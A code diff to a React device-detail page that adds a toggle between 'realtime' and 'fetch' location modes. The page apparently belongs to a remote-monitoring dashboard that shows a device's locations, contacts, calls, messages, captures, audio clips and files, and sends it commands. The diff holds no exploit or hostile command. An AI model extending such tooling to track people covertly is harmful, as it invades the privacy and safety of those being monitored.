@@ -26,7 +26,7 @@ export default function DeviceDetailPage() {
 
   const {
     device, locations, contacts, calls, messages, captures, audioClips, files, filesLoading, tabLoading, appCount,
-    activeTab, setActiveTab, loading, isRefreshing, toast, isLiveMovement,
+    activeTab, setActiveTab, loading, isRefreshing, toast, isLiveMovement, locationMode, setLocationMode,
     handleFullRefresh, handleToggleLiveMovement, sendCommand, handleDeleteCommand, handleBulkDeleteCommands,
     handleDeleteContact, handleDeleteCall, handleDeleteMessage, handleDeleteApp, handleDeleteFile,
     handleBulkDeleteContacts, handleBulkDeleteCalls, handleBulkDeleteMessages, handleBulkDeleteApps, handleBulkDeleteFiles,
@@ -92,6 +92,8 @@ export default function DeviceDetailPage() {
         isTabEnabled={isTabEnabled(activeTab)}
         onToggleTab={() => toggleTab(activeTab)}
         onToggleLiveMovement={handleToggleLiveMovement}
+        locationMode={locationMode}
+        onToggleLocationMode={() => setLocationMode(locationMode === "realtime" ? "fetch" : "realtime")}
         onSendCommand={sendCommand}
         onDeleteCommand={handleDeleteCommand}
         onBulkDeleteCommands={handleBulkDeleteCommands}
